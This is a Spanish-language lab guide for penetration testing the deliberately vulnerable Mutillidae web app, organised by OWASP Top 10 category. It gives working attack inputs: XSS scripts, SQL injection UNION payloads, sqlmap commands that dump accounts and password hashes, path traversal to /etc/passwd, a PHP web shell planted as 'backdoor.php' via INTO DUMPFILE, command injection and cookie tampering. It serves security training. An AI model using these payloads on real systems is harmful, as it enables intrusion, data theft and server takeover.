Bienvenidos al laboratorio de Top 10 OWASP Web Application
Este es un instructivo paso a paso que describe cómo realizar pruebas de penetración

Para instalar máquinas virtuales que cumplan como servidor de sitios web se puede hacer lo siguiente:


1.	Descargar las imágenes de https://app.vagrantup.com/rapid7/, pasarlas a formato .zip y descomprimirla 2 veces.
2.	Configurar las conexiones de red de ambas máquinas a Host Only
-	Comprobar conectividad entre máquinas.
Nota: Para instalar las máquinas virtuales se debe disponer de espacio en disco

Para la máquina Ubuntu instalada sus credenciales son las siguientes:
User name: vagrant
Password  vagrant

Comandos de ejecución para facilitar el procedimiento de recolección de información:
Sudo dhclient: refresca para obtener IP
Sudo iptables -F: Eliminar reglas de iptables
Sudo iptables -S: Verifica que se hayan bajado

Para la máquina Windows instalada sus credenciales son las siguientes:
Pass: vagrant

*Encender conexiones públicas a todos los activos de red en configuración de adaptador y red compartida.





Para realizar pentesting a nivel de aplicación web se recomienda hacer lo siguiente:

Descargue una imagen de Ubuntu 22.04.2 desde su página oficial e instálela en su virtualizador. https://releases.ubuntu.com/22.04/?_ga=2.68991833.991947535.1716281233-1488947370.1715037830

Descargue el archivo que contiene el paso a paso a realizar para la instalación mutillidae y sus dependencias https://drive.google.com/drive/folders/18rfIqI8Gh_s_zP9mDFkvlK2Lv8TMtnjJ?usp=sharing

1.	Compruebe conectividad entre máquinas y que el Burpsuite se encuentre escuchando a la máquina víctima
-	No olvide configurar el proxy manual en el navegador de Kali


A05
2.	 Implemente Skipfish de Kali para realizar Crawling o Spidering
El siguiente es el comando que puede ejecutar para lanzar el escaneo de Crwaling:
-	Verifique desde Burpsuite -> Target -> Site Map las capturas que se realizó del sitio
-	skipfish -YO -o Directorio/Nombre_archivo URL



A03, A01, A09, A04, A07
3.	Inyección de código:

-	En la página User info con ayuda de burpsuite capturaremos los atributos de la URL e intentaremos determinar si se está inyectando el código que escribimos estudiando el código fuente y revisando la probabilidad de romper el código para inyectar nuestro script.
-	Podemos probar (/ Cierre de Etiqueta) <script> alert(“Inyección de código”)</script> - /> <h1> Hola mundo </h1>
-	Codificar el script en la sección ‘Decoder’ de Burpsuite para que se lea en post.
-	Comprobar desde inspección de código fuente si se inyecta el código y revisar la etiqueta de apertura y cierre.


4. Injection SQL:

4.1	Provocar fallos a la BD mediante la utilización de caracteres reservados como ‘,”,;, etc. (‘ or 1=1 -- ) Para la página de User info y login comprobar qué ocurre

*	 Obtener nombre de base de datos mediante consultas:
-	En el formulario susceptible a Injection SQL :
-	' union select null, database(), null, null, null, null, null –
-	' union select null, version(), null, null, null, null, null –
-	' union select null,table_name, null, null, null, null, null from information_schema.tables – (Compruebe las opciones para Schema desde: https://cloud.google.com/bigquery/docs/information-schema-tables?hl=es-419)
-	' union select null,@@secure_file_priv, null, null, null, null, null  –
-	' union select null,load_file('/var/lib/mysql-files/fichero.txt'), null, null, null, null, null –

4.2 Blind SQL

Timing attack:
En un entorno en el que no sea posible determinar un error de consola se puede probar mediante Sleep() para saber si es vulnerable.
-	union select null, sleep(30), null, null, null, null, null –


A03, A09, A04, A07, A10
4.3 	Injection Blind SQL (SQLMAP)
-	Con SqlMap herramienta instalada en Kali es posible automatizar las consultas SQL para atacar el sitio, para ello es necesario hacer lo siguiente.
-	Inicie sesión en el portal de información de usuario y con el burpsuite en ‘intercept on’ guarde en un archivo .txt el tráfico capturado.
-	Realice las siguientes consultas en SQLMap
-	sqlmap --flush-session -r Desktop/request_forms.txt
-	sqlmap -r Desktop/request_forms.txt --ignore-redirects --batch --dbs -v 3
-	sqlmap -r Desktop/request_forms.txt --ignore-redirects --technique B -p username --current-user
-	sqlmap -r Desktop/request_forms.txt --ignore-redirects --batch --technique B -p username -U root@localhost –passwords
-	sqlmap -r Desktop/request_forms.txt --ignore-redirects --batch --dump -T accounts -D mutillidae
-	Validar todo el tráfico que genera el uso de esta herramienta desde wireshark


A04, A05, A07, A10
5.	Path Transversal
-	En este caso sabemos que los parámetros son susceptibles, de esta manera ingresamos a cualquier página del sitio y aprovechamos el parámetro ‘Page’ para hacer Path Transversal usando [(../../),(..\..\)]
-	192.168.56.101/mutillidae/index.php?page=../../../../../etc/passwd
-	192.168.56.101/mutillidae/index.php?page=..\..\..\..\..\windows


A03, A09, A04, A05
6.	WebShells
-	Debemos otorgarle permisos a la BD para tenga acceso a más rutas del servidor, para ellos tenemos que editar el siguiente archivo.
-	sudo gedit /etc/mysql/mysql.conf.d/mysqld.cnf
-	Justo debajo del parámetro ‘[mysqld]’ escribir ‘secure-file-priv = “”
-	Una vez guardado, en el terminal dirigirse a /var/www/html y ejecutar lo siguiente para darle permisos a la app al contenido completo de la carpeta
-	sudo chown -R mysql:mysql mutillidae/*
En algún campo de formulario ingresamos lo siguiente
-	' union select null, null, null, null, null, null, '<form action="" method="post" enctype="application/x-www-form-urlencoded"> <table style="margin-left:auto; margin-right:auto;"> <tr> <td colspan="2">Please enter system command</td> </tr> <tr><td></td></tr> <tr> <td class="label">Command</td> <td><input type="text" name="pCommand" size="50"></td></tr> <tr><td></td></tr> <tr> <td colspan="2" style="text-align:center;"> <input type="submit" value="Execute Command" /> </td> </tr> </table> </form> <?php echo "<pre>"; echo shell_exec($_REQUEST["pCommand"]); echo "</pre>"; 	?> ' INTO DUMPFILE '../../../../../var/www/html/mutillidae/backdoor.php' -- 
-	Esto nos carga una backdoor en el servidor y nos carga una webshell en la víctima
-	En el parámetro ‘page’ en la URL completamos de la siguiente manera: ‘page=backdoor.php’


A04, A05, A06, A07
7.	File load inclusion
-	En others-> Ubrestricted File upload -> file upload
-	Crear un archivo que será nuestro webshell para cargar en sitio.
-	Emacs webshell.php


A03, A09, A04, A07, A10
8.	XSS html injection
-	Navegue hasta la sección A7 -> Reflected -> Dns lookup
-	Una vez allí ejecute pruebas de inserción  HTML mediante etiquetas como <h1>text</h1>
-	En ayudas (HTML Injection) copie el script disponible para el ejercicio HTML INJECTION VIA COOKIE.(Debe modificar el campo de host con la IP del ubuntu y los ficheros de acceso al servicio web por "/mutillidae/index.php?page=capture-data.php")
-	Capture los parámetros de la URL de la petición con burpsuite
-	Convierta el script copia en formato de URL en la sección ‘decoder’ de burpsuite
-	Inyectelo en el parámetro de host y lancelo con burpsuite con un Forward.
Esto desplegará una alerta en la página que pedirá credenciales al usuario.
-	Para consultar los datos capturados diríjase a Others -> view captured data
-	-Ubique el script en el código fuente de la página


A03, A09, A04, A07
9.	CSRF (Cross-site request forgery)
-	Diríjase a owasp 2017 -> XSS -> Persistent -> Add to your blog
-	En ayuda escoja la opción (CSRF).
-	Edite el mensaje del script“force someone to add a blog” - AJAX y Force someone to register an account - AJAX. (Compruebe que los scripts no tengan comillas simples ' ' y reemplazarlas por comillas dobles " ")
-	Vaya a burpsuite y agregue un comentario en blog a su vez que captura el parámetro a sobreescribir.
-	Codifique el script a URL en ‘Decoder’ de burpsuite y envíelo con un forward con el parámetro localizado.
Ahora cada vez que acceda al sitio de blog se creará un mensaje automático con el usuario que esté en ese momento vinculado


A03, A04, A05, A10
10.	Command Injection
-	Navegue hasta la sección A7 XSS -> Reflected -> Dns lookup
-	En ayudas (Command injection) copie el script disponible para el ejercicio.
-	www.google.com;ls
-	Test; cat /etc/passwd


A09, A04, A07
11.	Cookie Tampering:
-	Con ayuda de burpsuite capturaremos las cookies que utiliza el sitio para funcionar. En login o registrar usuario agreguemos un usuario nuevo y revisemos la salida de burpsuite de sus atributos.
-	Deben haber 2 variables que cumplen como cookies, las cuáles editaremos para obtener acceso admin haciendo Bypass. [PHPSession y ShowHints]
- Forward
- Verificar las variables 'Set-Cookie' con parámetros username y uid -> Forward
- Realice una consulta en la página de usuarios y con burpsuite capture las peticiones. En los parámetros de cookie 'username' y 'uid' intente realizar cambios para entender su comportamiento.
- Cree un nuevo usuario y estudie la forma en la que aumenta o decrese el 'uid'



A04, A05
12.	ClickJacking:
Existe una forma rápida de validar si nuestro sitio web es vulnerable a click Jacking y es comprobando a través del siguiente sitio web:
-	https://clickjacker.io
En este sitio web se ‘virtualizará’ nuestra página en el servicio de alguien más.
-	https://securityheaders.com
También se puede validar si las cabeceras del sitio son seguras o no.

12.2 Cree un archivo base de html:

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Página creada para clickjacking</title>
</head>
<body>
    <h1>¡Mi primer intento de phishing :D!</h1>
    <iframe src="URL"> </iframe>
</body>
</html>




A02, A05, A08
13.	Verificación de comunicaciones (TLS Version y SSL)
En Kali Linux existe la herramienta nativa ‘testssl’.
- #	Sudo testssl IP


A04
14.	 Desbordamiento de buffer
El objetivo en esta prueba es provocar suficiente estrés en el servidor de datos para que vuelque su memoria, de esta manera provocar errores internos, sacar de servicio el sitio web o aprovechar cualquier otra oportunidad que brinden estas pruebas de estrés.
- Puede llevarse a cabo mediante la carga de archivos muy grandes o cadenas de texto enormes.

